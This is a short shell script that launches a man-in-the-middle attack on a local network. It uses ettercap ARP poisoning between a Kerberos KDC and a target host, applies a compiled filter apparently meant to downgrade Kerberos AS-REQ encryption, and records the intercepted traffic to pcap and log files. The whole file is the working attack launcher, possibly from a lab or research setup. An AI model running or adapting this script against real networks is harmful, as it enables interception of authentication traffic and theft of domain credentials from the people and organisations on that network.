#!/bin/sh

export KDC="192.168.1.11"
export TARGET="192.168.1.27"
export ETH="enp0s3"

cp krb5-downgrade-asreq.py /tmp
etterfilter krb5-downgrade-asreq.filter -o krb5-downgrade-asreq.ef
sudo ettercap -T -M arp:remote -i $ETH -F krb5-downgrade-asreq.ef /$KDC// /$TARGET// -w /tmp/ettercap.pcap |tee /tmp/ettercap.log
